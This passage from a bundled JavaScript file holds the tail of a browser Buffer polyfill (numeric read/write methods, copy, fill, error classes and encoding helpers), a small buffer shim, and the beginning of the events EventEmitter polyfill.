        } else if (start > len) {
          start = len;
        }
        if (end < 0) {
          end += len;
          if (end < 0) end = 0;
        } else if (end > len) {
          end = len;
        }
        if (end < start) end = start;
        const newBuf = this.subarray(start, end);
        Object.setPrototypeOf(newBuf, Buffer4.prototype);
        return newBuf;
      };
      function checkOffset(offset, ext, length) {
        if (offset % 1 !== 0 || offset < 0) throw new RangeError("offset is not uint");
        if (offset + ext > length) throw new RangeError("Trying to access beyond buffer length");
      }
      Buffer4.prototype.readUintLE = Buffer4.prototype.readUIntLE = function readUIntLE(offset, byteLength2, noAssert) {
        offset = offset >>> 0;
        byteLength2 = byteLength2 >>> 0;
        if (!noAssert) checkOffset(offset, byteLength2, this.length);
        let val = this[offset];
        let mul = 1;
        let i = 0;
        while (++i < byteLength2 && (mul *= 256)) {
          val += this[offset + i] * mul;
        }
        return val;
      };
      Buffer4.prototype.readUintBE = Buffer4.prototype.readUIntBE = function readUIntBE(offset, byteLength2, noAssert) {
        offset = offset >>> 0;
        byteLength2 = byteLength2 >>> 0;
        if (!noAssert) {
          checkOffset(offset, byteLength2, this.length);
        }
        let val = this[offset + --byteLength2];
        let mul = 1;
        while (byteLength2 > 0 && (mul *= 256)) {
          val += this[offset + --byteLength2] * mul;
        }
        return val;
      };
      Buffer4.prototype.readUint8 = Buffer4.prototype.readUInt8 = function readUInt8(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 1, this.length);
        return this[offset];
      };
      Buffer4.prototype.readUint16LE = Buffer4.prototype.readUInt16LE = function readUInt16LE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 2, this.length);
        return this[offset] | this[offset + 1] << 8;
      };
      Buffer4.prototype.readUint16BE = Buffer4.prototype.readUInt16BE = function readUInt16BE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 2, this.length);
        return this[offset] << 8 | this[offset + 1];
      };
      Buffer4.prototype.readUint32LE = Buffer4.prototype.readUInt32LE = function readUInt32LE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 4, this.length);
        return (this[offset] | this[offset + 1] << 8 | this[offset + 2] << 16) + this[offset + 3] * 16777216;
      };
      Buffer4.prototype.readUint32BE = Buffer4.prototype.readUInt32BE = function readUInt32BE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 4, this.length);
        return this[offset] * 16777216 + (this[offset + 1] << 16 | this[offset + 2] << 8 | this[offset + 3]);
      };
      Buffer4.prototype.readBigUInt64LE = defineBigIntMethod(function readBigUInt64LE(offset) {
        offset = offset >>> 0;
        validateNumber(offset, "offset");
        const first = this[offset];
        const last = this[offset + 7];
        if (first === void 0 || last === void 0) {
          boundsError(offset, this.length - 8);
        }
        const lo = first + this[++offset] * 2 ** 8 + this[++offset] * 2 ** 16 + this[++offset] * 2 ** 24;
        const hi = this[++offset] + this[++offset] * 2 ** 8 + this[++offset] * 2 ** 16 + last * 2 ** 24;
        return BigInt(lo) + (BigInt(hi) << BigInt(32));
      });
      Buffer4.prototype.readBigUInt64BE = defineBigIntMethod(function readBigUInt64BE(offset) {
        offset = offset >>> 0;
        validateNumber(offset, "offset");
        const first = this[offset];
        const last = this[offset + 7];
        if (first === void 0 || last === void 0) {
          boundsError(offset, this.length - 8);
        }
        const hi = first * 2 ** 24 + this[++offset] * 2 ** 16 + this[++offset] * 2 ** 8 + this[++offset];
        const lo = this[++offset] * 2 ** 24 + this[++offset] * 2 ** 16 + this[++offset] * 2 ** 8 + last;
        return (BigInt(hi) << BigInt(32)) + BigInt(lo);
      });
      Buffer4.prototype.readIntLE = function readIntLE(offset, byteLength2, noAssert) {
        offset = offset >>> 0;
        byteLength2 = byteLength2 >>> 0;
        if (!noAssert) checkOffset(offset, byteLength2, this.length);
        let val = this[offset];
        let mul = 1;
        let i = 0;
        while (++i < byteLength2 && (mul *= 256)) {
          val += this[offset + i] * mul;
        }
        mul *= 128;
        if (val >= mul) val -= Math.pow(2, 8 * byteLength2);
        return val;
      };
      Buffer4.prototype.readIntBE = function readIntBE(offset, byteLength2, noAssert) {
        offset = offset >>> 0;
        byteLength2 = byteLength2 >>> 0;
        if (!noAssert) checkOffset(offset, byteLength2, this.length);
        let i = byteLength2;
        let mul = 1;
        let val = this[offset + --i];
        while (i > 0 && (mul *= 256)) {
          val += this[offset + --i] * mul;
        }
        mul *= 128;
        if (val >= mul) val -= Math.pow(2, 8 * byteLength2);
        return val;
      };
      Buffer4.prototype.readInt8 = function readInt8(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 1, this.length);
        if (!(this[offset] & 128)) return this[offset];
        return (255 - this[offset] + 1) * -1;
      };
      Buffer4.prototype.readInt16LE = function readInt16LE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 2, this.length);
        const val = this[offset] | this[offset + 1] << 8;
        return val & 32768 ? val | 4294901760 : val;
      };
      Buffer4.prototype.readInt16BE = function readInt16BE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 2, this.length);
        const val = this[offset + 1] | this[offset] << 8;
        return val & 32768 ? val | 4294901760 : val;
      };
      Buffer4.prototype.readInt32LE = function readInt32LE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 4, this.length);
        return this[offset] | this[offset + 1] << 8 | this[offset + 2] << 16 | this[offset + 3] << 24;
      };
      Buffer4.prototype.readInt32BE = function readInt32BE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 4, this.length);
        return this[offset] << 24 | this[offset + 1] << 16 | this[offset + 2] << 8 | this[offset + 3];
      };
      Buffer4.prototype.readBigInt64LE = defineBigIntMethod(function readBigInt64LE(offset) {
        offset = offset >>> 0;
        validateNumber(offset, "offset");
        const first = this[offset];
        const last = this[offset + 7];
        if (first === void 0 || last === void 0) {
          boundsError(offset, this.length - 8);
        }
        const val = this[offset + 4] + this[offset + 5] * 2 ** 8 + this[offset + 6] * 2 ** 16 + (last << 24);
        return (BigInt(val) << BigInt(32)) + BigInt(first + this[++offset] * 2 ** 8 + this[++offset] * 2 ** 16 + this[++offset] * 2 ** 24);
      });
      Buffer4.prototype.readBigInt64BE = defineBigIntMethod(function readBigInt64BE(offset) {
        offset = offset >>> 0;
        validateNumber(offset, "offset");
        const first = this[offset];
        const last = this[offset + 7];
        if (first === void 0 || last === void 0) {
          boundsError(offset, this.length - 8);
        }
        const val = (first << 24) + // Overflow
        this[++offset] * 2 ** 16 + this[++offset] * 2 ** 8 + this[++offset];
        return (BigInt(val) << BigInt(32)) + BigInt(this[++offset] * 2 ** 24 + this[++offset] * 2 ** 16 + this[++offset] * 2 ** 8 + last);
      });
      Buffer4.prototype.readFloatLE = function readFloatLE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 4, this.length);
        return ieee754.read(this, offset, true, 23, 4);
      };
      Buffer4.prototype.readFloatBE = function readFloatBE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 4, this.length);
        return ieee754.read(this, offset, false, 23, 4);
      };
      Buffer4.prototype.readDoubleLE = function readDoubleLE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 8, this.length);
        return ieee754.read(this, offset, true, 52, 8);
      };
      Buffer4.prototype.readDoubleBE = function readDoubleBE(offset, noAssert) {
        offset = offset >>> 0;
        if (!noAssert) checkOffset(offset, 8, this.length);
        return ieee754.read(this, offset, false, 52, 8);
      };
      function checkInt(buf, value, offset, ext, max, min) {
        if (!Buffer4.isBuffer(buf)) throw new TypeError('"buffer" argument must be a Buffer instance');
        if (value > max || value < min) throw new RangeError('"value" argument is out of bounds');
        if (offset + ext > buf.length) throw new RangeError("Index out of range");
      }
      Buffer4.prototype.writeUintLE = Buffer4.prototype.writeUIntLE = function writeUIntLE(value, offset, byteLength2, noAssert) {
        value = +value;
        offset = offset >>> 0;
        byteLength2 = byteLength2 >>> 0;
        if (!noAssert) {
          const maxBytes = Math.pow(2, 8 * byteLength2) - 1;
          checkInt(this, value, offset, byteLength2, maxBytes, 0);
        }
        let mul = 1;
        let i = 0;
        this[offset] = value & 255;
        while (++i < byteLength2 && (mul *= 256)) {
          this[offset + i] = value / mul & 255;
        }
        return offset + byteLength2;
      };
      Buffer4.prototype.writeUintBE = Buffer4.prototype.writeUIntBE = function writeUIntBE(value, offset, byteLength2, noAssert) {
        value = +value;
        offset = offset >>> 0;
        byteLength2 = byteLength2 >>> 0;
        if (!noAssert) {
          const maxBytes = Math.pow(2, 8 * byteLength2) - 1;
          checkInt(this, value, offset, byteLength2, maxBytes, 0);
        }
        let i = byteLength2 - 1;
        let mul = 1;
        this[offset + i] = value & 255;
        while (--i >= 0 && (mul *= 256)) {
          this[offset + i] = value / mul & 255;
        }
        return offset + byteLength2;
      };
      Buffer4.prototype.writeUint8 = Buffer4.prototype.writeUInt8 = function writeUInt8(value, offset, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) checkInt(this, value, offset, 1, 255, 0);
        this[offset] = value & 255;
        return offset + 1;
      };
      Buffer4.prototype.writeUint16LE = Buffer4.prototype.writeUInt16LE = function writeUInt16LE(value, offset, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) checkInt(this, value, offset, 2, 65535, 0);
        this[offset] = value & 255;
        this[offset + 1] = value >>> 8;
        return offset + 2;
      };
      Buffer4.prototype.writeUint16BE = Buffer4.prototype.writeUInt16BE = function writeUInt16BE(value, offset, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) checkInt(this, value, offset, 2, 65535, 0);
        this[offset] = value >>> 8;
        this[offset + 1] = value & 255;
        return offset + 2;
      };
      Buffer4.prototype.writeUint32LE = Buffer4.prototype.writeUInt32LE = function writeUInt32LE(value, offset, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) checkInt(this, value, offset, 4, 4294967295, 0);
        this[offset + 3] = value >>> 24;
        this[offset + 2] = value >>> 16;
        this[offset + 1] = value >>> 8;
        this[offset] = value & 255;
        return offset + 4;
      };
      Buffer4.prototype.writeUint32BE = Buffer4.prototype.writeUInt32BE = function writeUInt32BE(value, offset, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) checkInt(this, value, offset, 4, 4294967295, 0);
        this[offset] = value >>> 24;
        this[offset + 1] = value >>> 16;
        this[offset + 2] = value >>> 8;
        this[offset + 3] = value & 255;
        return offset + 4;
      };
      function wrtBigUInt64LE(buf, value, offset, min, max) {
        checkIntBI(value, min, max, buf, offset, 7);
        let lo = Number(value & BigInt(4294967295));
        buf[offset++] = lo;
        lo = lo >> 8;
        buf[offset++] = lo;
        lo = lo >> 8;
        buf[offset++] = lo;
        lo = lo >> 8;
        buf[offset++] = lo;
        let hi = Number(value >> BigInt(32) & BigInt(4294967295));
        buf[offset++] = hi;
        hi = hi >> 8;
        buf[offset++] = hi;
        hi = hi >> 8;
        buf[offset++] = hi;
        hi = hi >> 8;
        buf[offset++] = hi;
        return offset;
      }
      function wrtBigUInt64BE(buf, value, offset, min, max) {
        checkIntBI(value, min, max, buf, offset, 7);
        let lo = Number(value & BigInt(4294967295));
        buf[offset + 7] = lo;
        lo = lo >> 8;
        buf[offset + 6] = lo;
        lo = lo >> 8;
        buf[offset + 5] = lo;
        lo = lo >> 8;
        buf[offset + 4] = lo;
        let hi = Number(value >> BigInt(32) & BigInt(4294967295));
        buf[offset + 3] = hi;
        hi = hi >> 8;
        buf[offset + 2] = hi;
        hi = hi >> 8;
        buf[offset + 1] = hi;
        hi = hi >> 8;
        buf[offset] = hi;
        return offset + 8;
      }
      Buffer4.prototype.writeBigUInt64LE = defineBigIntMethod(function writeBigUInt64LE(value, offset = 0) {
        return wrtBigUInt64LE(this, value, offset, BigInt(0), BigInt("0xffffffffffffffff"));
      });
      Buffer4.prototype.writeBigUInt64BE = defineBigIntMethod(function writeBigUInt64BE(value, offset = 0) {
        return wrtBigUInt64BE(this, value, offset, BigInt(0), BigInt("0xffffffffffffffff"));
      });
      Buffer4.prototype.writeIntLE = function writeIntLE(value, offset, byteLength2, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) {
          const limit = Math.pow(2, 8 * byteLength2 - 1);
          checkInt(this, value, offset, byteLength2, limit - 1, -limit);
        }
        let i = 0;
        let mul = 1;
        let sub = 0;
        this[offset] = value & 255;
        while (++i < byteLength2 && (mul *= 256)) {
          if (value < 0 && sub === 0 && this[offset + i - 1] !== 0) {
            sub = 1;
          }
          this[offset + i] = (value / mul >> 0) - sub & 255;
        }
        return offset + byteLength2;
      };
      Buffer4.prototype.writeIntBE = function writeIntBE(value, offset, byteLength2, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) {
          const limit = Math.pow(2, 8 * byteLength2 - 1);
          checkInt(this, value, offset, byteLength2, limit - 1, -limit);
        }
        let i = byteLength2 - 1;
        let mul = 1;
        let sub = 0;
        this[offset + i] = value & 255;
        while (--i >= 0 && (mul *= 256)) {
          if (value < 0 && sub === 0 && this[offset + i + 1] !== 0) {
            sub = 1;
          }
          this[offset + i] = (value / mul >> 0) - sub & 255;
        }
        return offset + byteLength2;
      };
      Buffer4.prototype.writeInt8 = function writeInt8(value, offset, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) checkInt(this, value, offset, 1, 127, -128);
        if (value < 0) value = 255 + value + 1;
        this[offset] = value & 255;
        return offset + 1;
      };
      Buffer4.prototype.writeInt16LE = function writeInt16LE(value, offset, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) checkInt(this, value, offset, 2, 32767, -32768);
        this[offset] = value & 255;
        this[offset + 1] = value >>> 8;
        return offset + 2;
      };
      Buffer4.prototype.writeInt16BE = function writeInt16BE(value, offset, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) checkInt(this, value, offset, 2, 32767, -32768);
        this[offset] = value >>> 8;
        this[offset + 1] = value & 255;
        return offset + 2;
      };
      Buffer4.prototype.writeInt32LE = function writeInt32LE(value, offset, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) checkInt(this, value, offset, 4, 2147483647, -2147483648);
        this[offset] = value & 255;
        this[offset + 1] = value >>> 8;
        this[offset + 2] = value >>> 16;
        this[offset + 3] = value >>> 24;
        return offset + 4;
      };
      Buffer4.prototype.writeInt32BE = function writeInt32BE(value, offset, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) checkInt(this, value, offset, 4, 2147483647, -2147483648);
        if (value < 0) value = 4294967295 + value + 1;
        this[offset] = value >>> 24;
        this[offset + 1] = value >>> 16;
        this[offset + 2] = value >>> 8;
        this[offset + 3] = value & 255;
        return offset + 4;
      };
      Buffer4.prototype.writeBigInt64LE = defineBigIntMethod(function writeBigInt64LE(value, offset = 0) {
        return wrtBigUInt64LE(this, value, offset, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"));
      });
      Buffer4.prototype.writeBigInt64BE = defineBigIntMethod(function writeBigInt64BE(value, offset = 0) {
        return wrtBigUInt64BE(this, value, offset, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"));
      });
      function checkIEEE754(buf, value, offset, ext, max, min) {
        if (offset + ext > buf.length) throw new RangeError("Index out of range");
        if (offset < 0) throw new RangeError("Index out of range");
      }
      function writeFloat(buf, value, offset, littleEndian, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) {
          checkIEEE754(buf, value, offset, 4, 34028234663852886e22, -34028234663852886e22);
        }
        ieee754.write(buf, value, offset, littleEndian, 23, 4);
        return offset + 4;
      }
      Buffer4.prototype.writeFloatLE = function writeFloatLE(value, offset, noAssert) {
        return writeFloat(this, value, offset, true, noAssert);
      };
      Buffer4.prototype.writeFloatBE = function writeFloatBE(value, offset, noAssert) {
        return writeFloat(this, value, offset, false, noAssert);
      };
      function writeDouble(buf, value, offset, littleEndian, noAssert) {
        value = +value;
        offset = offset >>> 0;
        if (!noAssert) {
          checkIEEE754(buf, value, offset, 8, 17976931348623157e292, -17976931348623157e292);
        }
        ieee754.write(buf, value, offset, littleEndian, 52, 8);
        return offset + 8;
      }
      Buffer4.prototype.writeDoubleLE = function writeDoubleLE(value, offset, noAssert) {
        return writeDouble(this, value, offset, true, noAssert);
      };
      Buffer4.prototype.writeDoubleBE = function writeDoubleBE(value, offset, noAssert) {
        return writeDouble(this, value, offset, false, noAssert);
      };
      Buffer4.prototype.copy = function copy(target, targetStart, start, end) {
        if (!Buffer4.isBuffer(target)) throw new TypeError("argument should be a Buffer");
        if (!start) start = 0;
        if (!end && end !== 0) end = this.length;
        if (targetStart >= target.length) targetStart = target.length;
        if (!targetStart) targetStart = 0;
        if (end > 0 && end < start) end = start;
        if (end === start) return 0;
        if (target.length === 0 || this.length === 0) return 0;
        if (targetStart < 0) {
          throw new RangeError("targetStart out of bounds");
        }
        if (start < 0 || start >= this.length) throw new RangeError("Index out of range");
        if (end < 0) throw new RangeError("sourceEnd out of bounds");
        if (end > this.length) end = this.length;
        if (target.length - targetStart < end - start) {
          end = target.length - targetStart + start;
        }
        const len = end - start;
        if (this === target && typeof Uint8Array.prototype.copyWithin === "function") {
          this.copyWithin(targetStart, start, end);
        } else {
          Uint8Array.prototype.set.call(
            target,
            this.subarray(start, end),
            targetStart
          );
        }
        return len;
      };
      Buffer4.prototype.fill = function fill(val, start, end, encoding) {
        if (typeof val === "string") {
          if (typeof start === "string") {
            encoding = start;
            start = 0;
            end = this.length;
          } else if (typeof end === "string") {
            encoding = end;
            end = this.length;
          }
          if (encoding !== void 0 && typeof encoding !== "string") {
            throw new TypeError("encoding must be a string");
          }
          if (typeof encoding === "string" && !Buffer4.isEncoding(encoding)) {
            throw new TypeError("Unknown encoding: " + encoding);
          }
          if (val.length === 1) {
            const code = val.charCodeAt(0);
            if (encoding === "utf8" && code < 128 || encoding === "latin1") {
              val = code;
            }
          }
        } else if (typeof val === "number") {
          val = val & 255;
        } else if (typeof val === "boolean") {
          val = Number(val);
        }
        if (start < 0 || this.length < start || this.length < end) {
          throw new RangeError("Out of range index");
        }
        if (end <= start) {
          return this;
        }
        start = start >>> 0;
        end = end === void 0 ? this.length : end >>> 0;
        if (!val) val = 0;
        let i;
        if (typeof val === "number") {
          for (i = start; i < end; ++i) {
            this[i] = val;
          }
        } else {
          const bytes = Buffer4.isBuffer(val) ? val : Buffer4.from(val, encoding);
          const len = bytes.length;
          if (len === 0) {
            throw new TypeError('The value "' + val + '" is invalid for argument "value"');
          }
          for (i = 0; i < end - start; ++i) {
            this[i + start] = bytes[i % len];
          }
        }
        return this;
      };
      var errors = {};
      function E(sym, getMessage, Base) {
        errors[sym] = class NodeError extends Base {
          constructor() {
            super();
            Object.defineProperty(this, "message", {
              value: getMessage.apply(this, arguments),
              writable: true,
              configurable: true
            });
            this.name = `${this.name} [${sym}]`;
            this.stack;
            delete this.name;
          }
          get code() {
            return sym;
          }
          set code(value) {
            Object.defineProperty(this, "code", {
              configurable: true,
              enumerable: true,
              value,
              writable: true
            });
          }
          toString() {
            return `${this.name} [${sym}]: ${this.message}`;
          }
        };
      }
      E(
        "ERR_BUFFER_OUT_OF_BOUNDS",
        function(name) {
          if (name) {
            return `${name} is outside of buffer bounds`;
          }
          return "Attempt to access memory outside buffer bounds";
        },
        RangeError
      );
      E(
        "ERR_INVALID_ARG_TYPE",
        function(name, actual) {
          return `The "${name}" argument must be of type number. Received type ${typeof actual}`;
        },
        TypeError
      );
      E(
        "ERR_OUT_OF_RANGE",
        function(str, range, input) {
          let msg = `The value of "${str}" is out of range.`;
          let received = input;
          if (Number.isInteger(input) && Math.abs(input) > 2 ** 32) {
            received = addNumericalSeparator(String(input));
          } else if (typeof input === "bigint") {
            received = String(input);
            if (input > BigInt(2) ** BigInt(32) || input < -(BigInt(2) ** BigInt(32))) {
              received = addNumericalSeparator(received);
            }
            received += "n";
          }
          msg += ` It must be ${range}. Received ${received}`;
          return msg;
        },
        RangeError
      );
      function addNumericalSeparator(val) {
        let res = "";
        let i = val.length;
        const start = val[0] === "-" ? 1 : 0;
        for (; i >= start + 4; i -= 3) {
          res = `_${val.slice(i - 3, i)}${res}`;
        }
        return `${val.slice(0, i)}${res}`;
      }
      function checkBounds(buf, offset, byteLength2) {
        validateNumber(offset, "offset");
        if (buf[offset] === void 0 || buf[offset + byteLength2] === void 0) {
          boundsError(offset, buf.length - (byteLength2 + 1));
        }
      }
      function checkIntBI(value, min, max, buf, offset, byteLength2) {
        if (value > max || value < min) {
          const n = typeof min === "bigint" ? "n" : "";
          let range;
          if (byteLength2 > 3) {
            if (min === 0 || min === BigInt(0)) {
              range = `>= 0${n} and < 2${n} ** ${(byteLength2 + 1) * 8}${n}`;
            } else {
              range = `>= -(2${n} ** ${(byteLength2 + 1) * 8 - 1}${n}) and < 2 ** ${(byteLength2 + 1) * 8 - 1}${n}`;
            }
          } else {
            range = `>= ${min}${n} and <= ${max}${n}`;
          }
          throw new errors.ERR_OUT_OF_RANGE("value", range, value);
        }
        checkBounds(buf, offset, byteLength2);
      }
      function validateNumber(value, name) {
        if (typeof value !== "number") {
          throw new errors.ERR_INVALID_ARG_TYPE(name, "number", value);
        }
      }
      function boundsError(value, length, type) {
        if (Math.floor(value) !== value) {
          validateNumber(value, type);
          throw new errors.ERR_OUT_OF_RANGE(type || "offset", "an integer", value);
        }
        if (length < 0) {
          throw new errors.ERR_BUFFER_OUT_OF_BOUNDS();
        }
        throw new errors.ERR_OUT_OF_RANGE(
          type || "offset",
          `>= ${type ? 1 : 0} and <= ${length}`,
          value
        );
      }
      var INVALID_BASE64_RE = /[^+/0-9A-Za-z-_]/g;
      function base64clean(str) {
        str = str.split("=")[0];
        str = str.trim().replace(INVALID_BASE64_RE, "");
        if (str.length < 2) return "";
        while (str.length % 4 !== 0) {
          str = str + "=";
        }
        return str;
      }
      function utf8ToBytes(string, units) {
        units = units || Infinity;
        let codePoint;
        const length = string.length;
        let leadSurrogate = null;
        const bytes = [];
        for (let i = 0; i < length; ++i) {
          codePoint = string.charCodeAt(i);
          if (codePoint > 55295 && codePoint < 57344) {
            if (!leadSurrogate) {
              if (codePoint > 56319) {
                if ((units -= 3) > -1) bytes.push(239, 191, 189);
                continue;
              } else if (i + 1 === length) {
                if ((units -= 3) > -1) bytes.push(239, 191, 189);
                continue;
              }
              leadSurrogate = codePoint;
              continue;
            }
            if (codePoint < 56320) {
              if ((units -= 3) > -1) bytes.push(239, 191, 189);
              leadSurrogate = codePoint;
              continue;
            }
            codePoint = (leadSurrogate - 55296 << 10 | codePoint - 56320) + 65536;
          } else if (leadSurrogate) {
            if ((units -= 3) > -1) bytes.push(239, 191, 189);
          }
          leadSurrogate = null;
          if (codePoint < 128) {
            if ((units -= 1) < 0) break;
            bytes.push(codePoint);
          } else if (codePoint < 2048) {
            if ((units -= 2) < 0) break;
            bytes.push(
              codePoint >> 6 | 192,
              codePoint & 63 | 128
            );
          } else if (codePoint < 65536) {
            if ((units -= 3) < 0) break;
            bytes.push(
              codePoint >> 12 | 224,
              codePoint >> 6 & 63 | 128,
              codePoint & 63 | 128
            );
          } else if (codePoint < 1114112) {
            if ((units -= 4) < 0) break;
            bytes.push(
              codePoint >> 18 | 240,
              codePoint >> 12 & 63 | 128,
              codePoint >> 6 & 63 | 128,
              codePoint & 63 | 128
            );
          } else {
            throw new Error("Invalid code point");
          }
        }
        return bytes;
      }
      function asciiToBytes(str) {
        const byteArray = [];
        for (let i = 0; i < str.length; ++i) {
          byteArray.push(str.charCodeAt(i) & 255);
        }
        return byteArray;
      }
      function utf16leToBytes(str, units) {
        let c, hi, lo;
        const byteArray = [];
        for (let i = 0; i < str.length; ++i) {
          if ((units -= 2) < 0) break;
          c = str.charCodeAt(i);
          hi = c >> 8;
          lo = c % 256;
          byteArray.push(lo);
          byteArray.push(hi);
        }
        return byteArray;
      }
      function base64ToBytes(str) {
        return base64.toByteArray(base64clean(str));
      }
      function blitBuffer(src, dst, offset, length) {
        let i;
        for (i = 0; i < length; ++i) {
          if (i + offset >= dst.length || i >= src.length) break;
          dst[i + offset] = src[i];
        }
        return i;
      }
      function isInstance(obj, type) {
        return obj instanceof type || obj != null && obj.constructor != null && obj.constructor.name != null && obj.constructor.name === type.name;
      }
      function numberIsNaN(obj) {
        return obj !== obj;
      }
      var hexSliceLookupTable = (function() {
        const alphabet = "0123456789abcdef";
        const table = new Array(256);
        for (let i = 0; i < 16; ++i) {
          const i16 = i * 16;
          for (let j = 0; j < 16; ++j) {
            table[i16 + j] = alphabet[i] + alphabet[j];
          }
        }
        return table;
      })();
      function defineBigIntMethod(fn) {
        return typeof BigInt === "undefined" ? BufferBigIntNotDefined : fn;
      }
      function BufferBigIntNotDefined() {
        throw new Error("BigInt not supported");
      }
    }
  });

  // buffer-shim.js
  var import_buffer;
  var init_buffer_shim = __esm({
    "buffer-shim.js"() {
      "use strict";
      import_buffer = __toESM(require_buffer(), 1);
    }
  });

  // node_modules/events/events.js
  var require_events = __commonJS({
    "node_modules/events/events.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var R = typeof Reflect === "object" ? Reflect : null;
      var ReflectApply = R && typeof R.apply === "function" ? R.apply : function ReflectApply2(target, receiver, args) {
        return Function.prototype.apply.call(target, receiver, args);
      };
      var ReflectOwnKeys;
      if (R && typeof R.ownKeys === "function") {
        ReflectOwnKeys = R.ownKeys;
      } else if (Object.getOwnPropertySymbols) {
        ReflectOwnKeys = function ReflectOwnKeys2(target) {
          return Object.getOwnPropertyNames(target).concat(Object.getOwnPropertySymbols(target));
        };
      } else {
        ReflectOwnKeys = function ReflectOwnKeys2(target) {
          return Object.getOwnPropertyNames(target);
        };
      }
      function ProcessEmitWarning(warning) {
        if (console && console.warn) console.warn(warning);
      }
      var NumberIsNaN = Number.isNaN || function NumberIsNaN2(value) {
        return value !== value;
      };
      function EventEmitter2() {
        EventEmitter2.init.call(this);
      }
      module.exports = EventEmitter2;
      module.exports.once = once;
      EventEmitter2.EventEmitter = EventEmitter2;
      EventEmitter2.prototype._events = void 0;
      EventEmitter2.prototype._eventsCount = 0;
      EventEmitter2.prototype._maxListeners = void 0;
      var defaultMaxListeners = 10;
      function checkListener(listener) {
        if (typeof listener !== "function") {
          throw new TypeError('The "listener" argument must be of type Function. Received type ' + typeof listener);
        }
      }
      Object.defineProperty(EventEmitter2, "defaultMaxListeners", {
        enumerable: true,
        get: function() {
          return defaultMaxListeners;
        },
        set: function(arg) {
          if (typeof arg !== "number" || arg < 0 || NumberIsNaN(arg)) {
            throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received ' + arg + ".");
          }
          defaultMaxListeners = arg;
        }
      });
      EventEmitter2.init = function() {
        if (this._events === void 0 || this._events === Object.getPrototypeOf(this)._events) {
          this._events = /* @__PURE__ */ Object.create(null);
          this._eventsCount = 0;
        }
        this._maxListeners = this._maxListeners || void 0;
      };
      EventEmitter2.prototype.setMaxListeners = function setMaxListeners(n) {
        if (typeof n !== "number" || n < 0 || NumberIsNaN(n)) {
          throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received ' + n + ".");
        }
        this._maxListeners = n;
        return this;
      };
      function _getMaxListeners(that) {
        if (that._maxListeners === void 0)
          return EventEmitter2.defaultMaxListeners;
        return that._maxListeners;
      }
      EventEmitter2.prototype.getMaxListeners = function getMaxListeners() {
        return _getMaxListeners(this);
      };
      EventEmitter2.prototype.emit = function emit(type) {
        var args = [];
        for (var i = 1; i < arguments.length; i++) args.push(arguments[i]);
        var doError = type === "error";
        var events = this._events;
        if (events !== void 0)
          doError = doError && events.error === void 0;
        else if (!doError)
          return false;
        if (doError) {
          var er;
          if (args.length > 0)
            er = args[0];
          if (er instanceof Error) {
            throw er;
          }
          var err = new Error("Unhandled error." + (er ? " (" + er.message + ")" : ""));
          err.context = er;
          throw err;
        }
        var handler = events[type];
        if (handler === void 0)
          return false;
        if (typeof handler === "function") {
          ReflectApply(handler, this, args);
        } else {
          var len = handler.length;
          var listeners = arrayClone(handler, len);
          for (var i = 0; i < len; ++i)
            ReflectApply(listeners[i], this, args);
        }
        return true;
      };
      function _addListener(target, type, listener, prepend) {
        var m;
        var events;
        var existing;
        checkListener(listener);
        events = target._events;
        if (events === void 0) {
          events = target._events = /* @__PURE__ */ Object.create(null);
          target._eventsCount = 0;
        } else {
          if (events.newListener !== void 0) {
            target.emit(
              "newListener",
              type,
              listener.listener ? listener.listener : listener
            );
            events = target._events;
          }
          existing = events[type];
        }
        if (existing === void 0) {
          existing = events[type] = listener;
          ++target._eventsCount;
        } else {
          if (typeof existing === "function") {
            existing = events[type] = prepend ? [listener, existing] : [existing, listener];
          } else if (prepend) {
            existing.unshift(listener);
          } else {
            existing.push(listener);
          }
          m = _getMaxListeners(target);
          if (m > 0 && existing.length > m && !existing.warned) {
            existing.warned = true;
            var w = new Error("Possible EventEmitter memory leak detected. " + existing.length + " " + String(type) + " listeners added. Use emitter.setMaxListeners() to increase limit");
            w.name = "MaxListenersExceededWarning";
            w.emitter = target;
            w.type = type;
            w.count = existing.length;
            ProcessEmitWarning(w);
          }
        }
        return target;
      }
      EventEmitter2.prototype.addListener = function addListener(type, listener) {
        return _addListener(this, type, listener, false);
      };
      EventEmitter2.prototype.on = EventEmitter2.prototype.addListener;
      EventEmitter2.prototype.prependListener = function prependListener(type, listener) {
        return _addListener(this, type, listener, true);
      };
      function onceWrapper() {
        if (!this.fired) {
          this.target.removeListener(this.type, this.wrapFn);
          this.fired = true;
          if (arguments.length === 0)
            return this.listener.call(this.target);
